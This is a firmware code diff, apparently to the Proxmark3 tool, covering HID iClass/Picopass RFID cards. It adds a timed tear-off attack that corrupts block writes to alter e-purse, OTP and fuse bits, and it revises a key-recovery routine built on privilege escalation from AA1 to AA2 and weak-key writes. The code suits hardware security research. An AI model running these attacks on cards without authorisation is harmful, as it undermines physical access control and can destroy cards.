@@ -38,6 +38,7 @@
 #include "iso15693.h"
 #include "iclass_cmd.h"              // iclass_card_select_t struct
 #include "i2c.h"                     // i2c defines (SIM module access)
+#include "printf.h"
 
 uint8_t get_pagemap(const picopass_hdr_t *hdr) {
     return (hdr->conf.fuses & (FUSE_CRYPT0 | FUSE_CRYPT1)) >> 3;
@@ -1244,7 +1245,6 @@ static bool iclass_send_cmd_with_retries(uint8_t *cmd, size_t cmdsize, uint8_t *
     while (tries-- > 0) {
 
         iclass_send_as_reader(cmd, cmdsize, start_time, eof_time, shallow_mod);
-
         if (resp == NULL) {
             return true;
         }
@@ -1582,8 +1582,9 @@ bool iclass_read_block(uint16_t blockno, uint8_t *data, uint32_t *start_time, ui
     uint8_t c[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
     AddCrc(c + 1, 1);
     bool isOK = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time, shallow_mod);
-    if (isOK)
+    if (isOK) {
         memcpy(data, resp, 8);
+    }
     return isOK;
 }
 
@@ -1780,15 +1781,37 @@ static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, 
         }
     } else if (blockno == 3 || blockno == 4) {
         // check response. Key updates always return 0xffffffffffffffff
-        uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-        if (memcmp(all_ff, resp, 8)) {
+        uint8_t all_ff[PICOPASS_BLOCK_SIZE] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+        if (memcmp(all_ff, resp, PICOPASS_BLOCK_SIZE)) {
             return false;
         }
     } else {
         // check response. All other updates return unchanged data
-        if (memcmp(data, resp, 8)) {
+        if (memcmp(data, resp, PICOPASS_BLOCK_SIZE)) {
             return false;
         }
+    }
+
+    return true;
+}
+
+static bool iclass_writeblock_sp(uint8_t blockno, uint8_t *data, uint8_t *mac, bool shallow_mod, uint32_t *start_time, uint32_t *eof_time) {
+
+    // write command: cmd, 1 blockno, 8 data, 4 mac
+    uint8_t write[14] = { 0x80 | ICLASS_CMD_UPDATE, blockno };
+    uint8_t write_len = 14;
+    memcpy(write + 2, data, 8);
+    memcpy(write + 10, mac, 4);
+
+    uint8_t resp[10] = {0};
+    bool isOK = iclass_send_cmd_with_retries(write, write_len, resp, sizeof(resp), 10, 3, start_time, ICLASS_READER_TIMEOUT_UPDATE, eof_time, shallow_mod);
+    if (isOK == false) {
+        return false;
+    }
+
+    // check response. All other updates return unchanged data
+    if (memcmp(data, resp, PICOPASS_BLOCK_SIZE)) {
+        return false;
     }
 
     return true;
@@ -1829,7 +1852,7 @@ void iClass_WriteBlock(uint8_t *msg) {
     }
 
     // new block data
-    memcpy(write + 2, payload->data, 8);
+    memcpy(write + 2, payload->data, PICOPASS_BLOCK_SIZE);
 
     uint8_t pagemap = get_pagemap(&hdr);
     if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
@@ -1847,7 +1870,7 @@ void iClass_WriteBlock(uint8_t *msg) {
             // Secure tags uses MAC
             uint8_t wb[9];
             wb[0] = payload->req.blockno;
-            memcpy(wb + 1, payload->data, 8);
+            memcpy(wb + 1, payload->data, PICOPASS_BLOCK_SIZE);
 
             if (payload->req.use_credit_key)
                 doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
@@ -2074,6 +2097,421 @@ out:
         reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_SUCCESS, (uint8_t *)&res, sizeof(uint8_t));
 }
 
+static void iclass_cmp_print(uint8_t *b1, uint8_t *b2, const char *header1, const char *header2) {
+
+    char line1[240] = {0};
+    char line2[240] = {0};
+
+    strcat(line1, header1);
+    strcat(line2, header2);
+
+    for (uint8_t i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
+
+        int l1 = strlen(line1);
+        int l2 = strlen(line2);
+
+        uint8_t hi1 = NIBBLE_HIGH(b1[i]);
+        uint8_t low1 = NIBBLE_LOW(b1[i]);
+
+        uint8_t hi2 = NIBBLE_HIGH(b2[i]);
+        uint8_t low2 = NIBBLE_LOW(b2[i]);
+
+        if (hi1 != hi2) {
+            sprintf(line1 + l1, _RED_("%1X"), hi1);
+            sprintf(line2 + l2, _GREEN_("%1X"), hi2);
+        } else {
+            sprintf(line1 + l1, "%1X", hi1);
+            sprintf(line2 + l2, "%1X", hi2);
+        }
+
+        l1 = strlen(line1);
+        l2 = strlen(line2);
+
+        if (low1 != low2) {
+            sprintf(line1 + l1, _RED_("%1X"), low1);
+            sprintf(line2 + l2, _GREEN_("%1X"), low2);
+        } else {
+            sprintf(line1 + l1, "%1X", low1);
+            sprintf(line2 + l2, "%1X", low2);
+        }
+    }
+    DbpString(line1);
+    DbpString(line2);
+}
+
+void iClass_TearBlock(iclass_tearblock_req_t *msg) {
+
+    if (msg == NULL) {
+        reply_ng(CMD_HF_ICLASS_TEARBL, PM3_ESOFT, NULL, 0);
+        return;
+    }
+
+    // local variable copies
+    int tear_start = msg->tear_start;
+    int tear_end = msg->tear_end;
+    int tear_inc = msg->increment;
+    int tear_loop = msg->tear_loop;
+
+    int loop_count = 0;
+
+    uint32_t start_time = 0;
+    uint32_t eof_time = 0;
+
+    int isok = PM3_SUCCESS;
+
+    uint8_t data[8] = {0};
+    memcpy(data, msg->data, sizeof(data));
+
+    uint8_t mac[4] = {0};
+    memcpy(mac, msg->mac, sizeof(mac));
+
+    picopass_hdr_t hdr = {0};
+    iclass_auth_req_t req = {
+        .blockno = msg->req.blockno,
+        .do_auth = msg->req.do_auth,
+        .send_reply = msg->req.send_reply,
+        .shallow_mod = msg->req.shallow_mod,
+        .use_credit_key = msg->req.use_credit_key,
+        .use_elite = msg->req.use_elite,
+        .use_raw = msg->req.use_raw,
+        .use_replay = msg->req.use_replay
+    };
+    memcpy(req.key, msg->req.key, PICOPASS_BLOCK_SIZE);
+
+    LED_A_ON();
+    Iso15693InitReader();
+
+    // save old debug log level
+    int oldbg = g_dbglevel;
+
+    // no debug logging please
+    g_dbglevel = DBG_NONE;
+
+    // select
+    bool res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+    if (res == false) {
+        DbpString(_RED_("Failed to select iClass tag"));
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    // authenticate
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&req, &hdr, &start_time, &eof_time, mac);
+    if (res == false) {
+        DbpString(_RED_("Failed to authenticate with iClass tag"));
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    uint8_t data_read_orig[PICOPASS_BLOCK_SIZE] = {0};
+
+    // read block
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = iclass_read_block(req.blockno, data_read_orig, &start_time, &eof_time, req.shallow_mod);
+    if (res == false) {
+        Dbprintf("Failed to read block %u", req.blockno);
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    bool erase_phase = false;
+    bool read_ok = false;
+
+    // static uint8_t empty[PICOPASS_BLOCK_SIZE] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    static uint8_t zeros[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+    uint8_t ff_data[PICOPASS_BLOCK_SIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
+    uint8_t data_read[PICOPASS_BLOCK_SIZE] = {0};
+
+    // create READ command
+    uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, req.blockno, 0x00, 0x00};
+    AddCrc(cmd_read + 1, 1);
+
+    // create WRITE COMMAND and new block data
+    uint8_t cmd_write[14] = { 0x80 | ICLASS_CMD_UPDATE, req.blockno };
+    uint8_t cmd_write_len = 14;
+    memcpy(cmd_write + 2, data, PICOPASS_BLOCK_SIZE);
+
+    uint8_t pagemap = get_pagemap(&hdr);
+    if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
+        // Unsecured tags uses CRC16,  but don't include the UPDATE operation code
+        // byte0 = update op
+        // byte1 = block no
+        // byte2..9 = new block data
+        AddCrc(cmd_write + 1, 9);
+        cmd_write_len -= 2;
+    } else {
+
+        if (req.use_replay) {
+            memcpy(cmd_write + 10, mac, sizeof(mac));
+        } else {
+            // Secure tags uses MAC
+            uint8_t wb[9];
+            wb[0] = req.blockno;
+            memcpy(wb + 1, data, PICOPASS_BLOCK_SIZE);
+
+            if (req.use_credit_key)
+                doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
+            else
+                doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+
+            memcpy(cmd_write + 10, mac, sizeof(mac));
+        }
+    }
+
+    // Main loop
+    while ((tear_start <= tear_end) && (read_ok == false)) {
+
+        if (BUTTON_PRESS() || data_available()) {
+            isok = PM3_EOPABORTED;
+            goto out;
+        }
+
+        // set tear off trigger
+        g_tearoff_enabled = true;
+        g_tearoff_delay_us = (tear_start & 0xFFFF);
+
+        if (tear_loop > 1) {
+            DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Tear off delay " _YELLOW_("%u") " / " _YELLOW_("%u") " us - " _YELLOW_("%3u") " iter", tear_start, tear_end, loop_count + 1);
+        } else {
+            DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Tear off delay " _YELLOW_("%u") " / " _YELLOW_("%u") " us", tear_start, tear_end);
+        }
+
+        // write block
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(cmd_write, cmd_write_len, &start_time, &eof_time, req.shallow_mod);
+
+        tearoff_hook();
+
+        switch_off();
+
+        // start reading block
+
+        // reinit
+        Iso15693InitReader();
+
+        // select tag
+        res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+        if (res == false) {
+            continue;
+        }
+
+        // skip authentication for config and e-purse blocks (1,2)
+        if (req.blockno > 2) {
+
+            // authenticate
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+            res = authenticate_iclass_tag(&req, &hdr, &start_time, &eof_time, NULL);
+            if (res == false) {
+                DbpString("Failed to authenticate after tear");
+                continue;
+            }
+        }
+
+        // read again and keep field on
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        res = iclass_read_block(req.blockno, data_read, &start_time, &eof_time, req.shallow_mod);
+        if (res == false) {
+            DbpString("Failed to read block after tear");
+            continue;
+        }
+
+        //
+        bool tear_success = true;
+
+        if (memcmp(data_read, data, PICOPASS_BLOCK_SIZE) != 0) {
+            tear_success = false;
+        }
+
+        if ((tear_success == false) &&
+                (memcmp(data_read, zeros, PICOPASS_BLOCK_SIZE) != 0) &&
+                (memcmp(data_read, data_read_orig, PICOPASS_BLOCK_SIZE) != 0)) {
+
+            // tearoff succeeded (partially)
+
+            if (memcmp(data_read, ff_data, PICOPASS_BLOCK_SIZE) == 0 &&
+                    memcmp(data_read_orig, ff_data, PICOPASS_BLOCK_SIZE) != 0) {
+
+                if(erase_phase == false){
+                    DbpString("");
+                    DbpString(_CYAN_("Erase phase hit... ALL ONES"));
+
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                }
+                erase_phase = true;
+
+            } else {
+
+                if (erase_phase) {
+                    DbpString("");
+                    DbpString(_MAGENTA_("Tearing! Write phase (post erase)"));
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                } else {
+                    DbpString("");
+                    DbpString(_CYAN_("Tearing! unknown phase"));
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                }
+            }
+
+            // shall we exit?   well it depends on some things.
+            bool goto_out = false;
+
+            if (req.blockno == 2) {
+                if (memcmp(data_read, ff_data, PICOPASS_BLOCK_SIZE) == 0 && memcmp(data_read_orig, ff_data, PICOPASS_BLOCK_SIZE) != 0) {
+                    DbpString("");
+                    Dbprintf("E-purse has been teared ( %s )", _GREEN_("ok"));
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+            }
+
+            if (req.blockno == 1) {
+
+                // if more OTP bits set..
+                if (data_read[1] > data_read_orig[1] ||
+                        data_read[2] > data_read_orig[2]) {
+
+
+                    // step 4 if bits changed attempt to write the new bits to the tag
+                    if (data_read[7] == 0xBC) {
+                        data_read[7] = 0xAC;
+                    }
+
+                    // prepare WRITE command
+                    cmd_write_len = 14;
+                    memcpy(cmd_write + 2, data_read, PICOPASS_BLOCK_SIZE);
+
+                    if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
+                        // Unsecured tags uses CRC16,  but don't include the UPDATE operation code
+                        // byte0 = update op
+                        // byte1 = block no
+                        // byte2..9 = new block data
+                        AddCrc(cmd_write + 1, 9);
+                        cmd_write_len -= 2;
+                    } else {
+
+                        if (req.use_replay) {
+                            memcpy(cmd_write + 10, mac, sizeof(mac));
+                        } else {
+                            // Secure tags uses MAC
+                            uint8_t wb[9];
+                            wb[0] = req.blockno;
+                            memcpy(wb + 1, data_read, PICOPASS_BLOCK_SIZE);
+
+                            if (req.use_credit_key)
+                                doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
+                            else
+                                doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+
+                            memcpy(cmd_write + 10, mac, sizeof(mac));
+                        }
+                    }
+
+                    // write block
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(cmd_write, cmd_write_len, &start_time, &eof_time, req.shallow_mod);
+
+                    uint16_t resp_len = 0;
+                    uint8_t resp[ICLASS_BUFFER_SIZE] = {0};
+                    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time, false, true, &resp_len);
+                    if (res == PM3_SUCCESS && resp_len == 10) {
+                        Dbprintf("Wrote to block");
+                    }
+
+                    switch_off();
+
+                    DbpString("");
+                    DbpString("More OTP bits got set!!!");
+
+                    Iso15693InitReader();
+
+                    // select tag,   during which we read block1
+                    res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+                    if (res) {
+
+                        if (memcmp(&hdr.conf, cmd_write + 2, PICOPASS_BLOCK_SIZE) == 0) {
+                            Dbprintf("Stabilize the bits ( "_GREEN_("ok") " )");
+                        } else {
+                            Dbprintf("Stabilize the bits ( "_RED_("failed") " )");
+                        }
+                    }
+
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+
+                if (data_read[0] != data_read_orig[0]) {
+                    DbpString("");
+                    Dbprintf("Application limit changed, from "_YELLOW_("%u")" to "_YELLOW_("%u"), data_read_orig[0], data_read[0]);
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+
+                if (data_read[7] != data_read_orig[7]) {
+                    DbpString("");
+                    Dbprintf("Fuse changed, from "_YELLOW_("%02x")" to "_YELLOW_("%02x"), data_read_orig[7], data_read[7]);
+
+                    const char *flag_names[8] = {
+                        "RA",
+                        "Fprod0",
+                        "Fprod1",
+                        "Crypt0 (*1)",
+                        "Crypt1 (*0)",
+                        "Coding0",
+                        "Coding1",
+                        "Fpers  (*1)"
+                    };
+                    Dbprintf(_YELLOW_("%-10s %-10s %-10s"), "Fuse", "Original", "Changed");
+                    Dbprintf("---------------------------------------");
+                    for (int i = 7; i >= 0; --i) {
+                        int bit1 = (data_read_orig[7] >> i) & 1;
+                        int bit2 = (data_read[7] >> i) & 1;
+                        Dbprintf("%-11s %-10d %-10d", flag_names[i], bit1, bit2);
+                    }
+
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+            }
+
+            if (goto_out) {
+                goto out;
+            }
+        }
+
+        // tearoff succeeded with expected values,  which is unlikely
+        if (tear_success) {
+            read_ok = true;
+            tear_success = true;
+            DbpString("");
+            DbpString("tear success (expected values)!");
+        }
+
+        loop_count++;
+
+        // increase tear off delay
+        if (loop_count == tear_loop) {
+            tear_start += tear_inc;
+            loop_count = 0;
+        }
+    }
+
+out:
+
+    switch_off();
+
+    // reset tear off trigger
+    g_tearoff_enabled = false;
+
+    // restore debug message levels
+    g_dbglevel = oldbg;
+
+    if (msg->req.send_reply) {
+        reply_ng(CMD_HF_ICLASS_TEARBL, isok, NULL, 0);
+    }
+}
+
 void iClass_Restore(iclass_restore_req_t *msg) {
 
     // sanitation
@@ -2204,6 +2642,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     int bits_found = -1;
     bool recovered = false;
     bool completed = false;
+    bool interrupted = false;
     uint8_t div_key2[8] = {0};
     uint32_t eof_time = 0;
     uint32_t start_time = 0;
@@ -2225,7 +2664,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     };
 
     LED_A_ON();
-    DbpString(_RED_("Interrupting this process will render the card unusable!"));
+    DbpString(_RED_("Interrupting this process may render the card unusable!"));
     memcpy(div_key2, msg->nfa, 8);
 
     //START LOOP
@@ -2243,8 +2682,26 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         uint8_t mac2[4] = {0};
         picopass_hdr_t hdr = {0};
         bool res = false;
+        int status_message = 0;
 
         while (!card_select || !card_auth) {
+
+            if (BUTTON_PRESS() || loops > msg->loop) {
+                if(loops > msg->loop){
+                    completed = true;
+                }else{
+                    interrupted = true;
+                }
+                goto out;
+            }
+
+            if (msg->test) {
+                Dbprintf(_YELLOW_("*Cycled Reader*") " TEST Index - Loops: "_YELLOW_("%3d / %3d") " *", loops, msg->loop);
+            }else if (msg->debug){
+                Dbprintf(_YELLOW_("*Cycled Reader*") " Index: "_RED_("%3d")" Loops: "_YELLOW_("%3d / %3d") " *", index, loops, msg->loop);
+            }else{
+                DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Index: "_CYAN_("%3d")" Loops: "_YELLOW_("%3d / %3d")" ", index, loops, msg->loop);
+            }
             Iso15693InitReader(); //has to be at the top as it starts tracing
             if (!msg->debug) {
                 set_tracing(false); //disable tracing to prevent crashes - set to true for debugging
@@ -2253,18 +2710,11 @@ void iClass_Recover(iclass_recover_req_t *msg) {
                     clear_trace(); //if we're debugging better to clear the trace but do it only on the first loop
                 }
             }
-            if (msg->test) {
-                Dbprintf(_YELLOW_("*Cycled Reader*") " ----------------- TEST Index - Loops: "_YELLOW_("%3d / %3d") " --------------*", loops, msg->loop);
-            } else {
-                Dbprintf(_YELLOW_("*Cycled Reader*") " ----------------- Index: "_RED_("%3d")" Loops: "_YELLOW_("%3d / %3d") " --------------*", index, loops, msg->loop);
-            }
             //Step0 Card Select Routine
             eof_time = 0; //reset eof time
             res = select_iclass_tag(&hdr, false, &eof_time, shallow_mod);
-            if (res == false) {
-                DbpString(_RED_("Unable to select card after reader cycle! Retrying..."));
-            } else {
-                DbpString(_GREEN_("Card selected successfully!"));
+            if (res) {
+                status_message = 1; //card select successful
                 card_select = true;
             }
 
@@ -2273,10 +2723,8 @@ void iClass_Recover(iclass_recover_req_t *msg) {
                 memcpy(original_mac, msg->req.key, 8);
                 start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
-                if (res == false) {
-                    DbpString(_RED_("Unable to authenticate on AA1 using macs! Retrying..."));
-                } else {
-                    DbpString(_GREEN_("AA1 authentication with macs successful!"));
+                if (res) {
+                    status_message = 2; //authentication with AA1 macs successful
                     card_auth = true;
                 }
             }
@@ -2285,6 +2733,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
                 switch_off();
             }
             if (reinit_tentatives == 5) {
+                DbpString("");
                 DbpString(_RED_("Unable to select or authenticate with card multiple times! Stopping."));
                 goto out;
             }
@@ -2292,23 +2741,22 @@ void iClass_Recover(iclass_recover_req_t *msg) {
 
         //Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
         uint8_t blockno = 24;
-        uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
-        AddCrc(cmd_read + 1, 1);
         int priv_esc_tries = 0;
         bool priv_esc = false;
         while (!priv_esc) {
             //The privilege escalation is done with a readcheck and not just a normal read!
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
             iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
             // expect a 8-byte response here
             res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
             if (res2 != PM3_SUCCESS || resp_len != 8) {
-                DbpString(_YELLOW_("Privilege Escalation -> ")_RED_("Read failed! Trying again..."));
                 priv_esc_tries++;
             } else {
-                DbpString(_YELLOW_("Privilege Escalation -> ")_GREEN_("Response OK!"));
+                status_message = 3; //privilege escalation successful
                 priv_esc = true;
             }
             if (priv_esc_tries == 5) {
+                DbpString("");
                 DbpString(_RED_("Unable to complete privilege escalation! Stopping."));
                 goto out;
             }
@@ -2327,37 +2775,37 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         wb[0] = blockno;
         memcpy(wb + 1, genkeyblock, 8);
         doMAC_N(wb, sizeof(wb), div_key2, mac2);
-        bool use_mac = true;
         bool written = false;
         bool write_error = false;
         while (written == false && write_error == false) {
             //Step5 Perform Write
-            if (iclass_writeblock_ext(blockno, genkeyblock, mac2, use_mac, shallow_mod)) {
-                DbpString("Wrote key: ");
-                Dbhexdump(8, genkeyblock, false);
+            if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time)) {
+                status_message = 4; //wrote new key on the card - unverified
             }
             //Reset cypher state
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
             iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
-            res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
             //try to authenticate with the original mac to verify the write happened
             memcpy(msg->req.key, original_mac, 8);
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
             res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
             if (msg->test) {
-                if (res != true) {
-                    DbpString(_RED_("*** CARD EPURSE IS SILENT! RISK OF BRICKING! DO NOT EXECUTE KEY UPDATES! SCAN IT ON READER FOR EPURSE UPDATE, COLLECT NEW TRACES AND TRY AGAIN! ***"));
-                    goto out;
-                } else {
+                if (res) {
+                    DbpString("");
                     DbpString(_GREEN_("*** CARD EPURSE IS LOUD! OK TO ATTEMPT KEY RETRIEVAL! RUN AGAIN WITH -notest ***"));
                     completed = true;
                     goto out;
+                } else {
+                    DbpString("");
+                    DbpString(_RED_("*** CARD EPURSE IS SILENT! RISK OF BRICKING! DO NOT EXECUTE KEY UPDATES! SCAN IT ON READER FOR EPURSE UPDATE, COLLECT NEW TRACES AND TRY AGAIN! ***"));
+                    goto out;
                 }
             } else {
-                if (res != true) {
-                    DbpString("Write Operation : "_GREEN_("VERIFIED! Card Key Updated!"));
-                    written = true;
+                if (res) {
+                    write_error = true; //failed to update the key, the card's key is the original one
                 } else {
-                    DbpString("Write Operation : "_RED_("FAILED! Card Key is the Original. Retrying..."));
-                    write_error = true;
+                    status_message = 5; //verified the card key was updated to the new one
+                    written = true;
                 }
             }
         }
@@ -2365,16 +2813,14 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         if (!write_error) {
             //Step6 Perform 8 authentication attempts + 1 to verify if we found the weak key
             for (int i = 0; i < 8 ; ++i) {
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
-                res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
                 //need to craft the authentication payload accordingly
                 memcpy(msg->req.key, iclass_mac_table[i], 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
                 if (res == true) {
                     bits_found = i;
-                    DbpString(_RED_("--------------------------------------------------------"));
-                    Dbprintf("Decimal Value of last 3 bits: " _GREEN_("[%3d]"), bits_found);
-                    DbpString(_RED_("--------------------------------------------------------"));
                     recovered = true;
                 }
             }
@@ -2384,37 +2830,36 @@ void iClass_Recover(iclass_recover_req_t *msg) {
             uint8_t revert_retries = 0;
             while (!reverted) {
                 //Regain privilege escalation with a readcheck
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
                 // TODO: check result
-                GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
-
-                DbpString(_YELLOW_("Attempting to restore the original key. "));
-                if (iclass_writeblock_ext(blockno, genkeyblock, mac2, use_mac, shallow_mod)) {
-                    DbpString("Restore of Original Key "_GREEN_("successful."));
-                } else {
-                    DbpString("Restore of Original Key " _RED_("failed."));
+                //GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time)) {
+                    status_message = 6; //restore of original key successful but unverified
                 }
-                DbpString(_YELLOW_("Verifying Key Restore..."));
                 //Do a readcheck first to reset the cypher state
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
                 // TODO: check result
-                GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
-
+                //GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
                 //need to craft the authentication payload accordingly
                 memcpy(msg->req.key, original_mac, 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
                 res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
                 if (res == true) {
-                    DbpString("Restore of Original Key "_GREEN_("VERIFIED! Card is usable again."));
+                    status_message = 7; //restore of original key verified - card usable again
                     reverted = true;
                     if (recovered) {
                         goto restore;
                     }
-                } else {
-                    DbpString("Restore of Original Key "_RED_("VERIFICATION FAILED! Trying again..."));
                 }
 
                 revert_retries++;
                 if (revert_retries >= 7) { //must always be an odd number!
+                    DbpString("");
+                    DbpString(_CYAN_("Last Written Key: "));
+                    Dbhexdump(8, genkeyblock, false);
                     Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
                     goto out;
                 }
@@ -2422,11 +2867,35 @@ void iClass_Recover(iclass_recover_req_t *msg) {
 
         }
 
-        if (loops >= msg->loop) {
-            completed = true;
-            goto out;
+        if(msg->debug){
+            if(status_message >= 1){
+                DbpString("");
+                DbpString("Card Select:............."_GREEN_("Ok!"));
+            }
+            if(status_message >= 2){
+                DbpString("AA1 macs authentication:."_GREEN_("Ok!"));
+            }
+            if(status_message >= 3){
+                DbpString("Privilege Escalation:...."_GREEN_("Ok!"));
+            }
+            if(status_message >= 4){
+                DbpString("Wrote key: ");
+                Dbhexdump(8, genkeyblock, false);
+            }
+            if(status_message >= 5){
+                DbpString("Key Update:.............."_GREEN_("Verified!"));
+            }
+            if(status_message >= 6){
+                DbpString("Original Key Restore:...."_GREEN_("Ok!"));
+            }
+            if(status_message >= 7){
+                DbpString("Original Key Restore:...."_GREEN_("Verified!"));
+            }
         }
-        if (!write_error) { //if there was a write error, re-run the loop for the same key index
+
+        if (write_error && (msg->debug || msg->test)) { //if there was a write error, re-run the loop for the same key index
+            DbpString("Loop Error: "_RED_("Repeating Loop!"));
+        }else{
             loops++;
             index++;
         }
@@ -2442,6 +2911,10 @@ restore:
         partialkey[i] = genkeyblock[i] ^ bits_found;
     }
 
+    //Print the bits decimal value
+    DbpString("");
+    DbpString(_RED_("--------------------------------------------------------"));
+    Dbprintf("Decimal Value of last 3 bits: " _GREEN_("[%3d]"), bits_found);
     //Print the 24 bits found from k1
     DbpString(_RED_("--------------------------------------------------------"));
     DbpString(_RED_("SUCCESS! Raw Key Partial Bytes: "));
@@ -2456,6 +2929,8 @@ out:
     switch_off();
     if (completed) {
         reply_ng(CMD_HF_ICLASS_RECOVER, PM3_EINVARG, NULL, 0);
+    } else if (interrupted){
+        reply_ng(CMD_HF_ICLASS_RECOVER, PM3_EOPABORTED, NULL, 0);
     } else {
         reply_ng(CMD_HF_ICLASS_RECOVER, PM3_ESOFT, NULL, 0);
     }
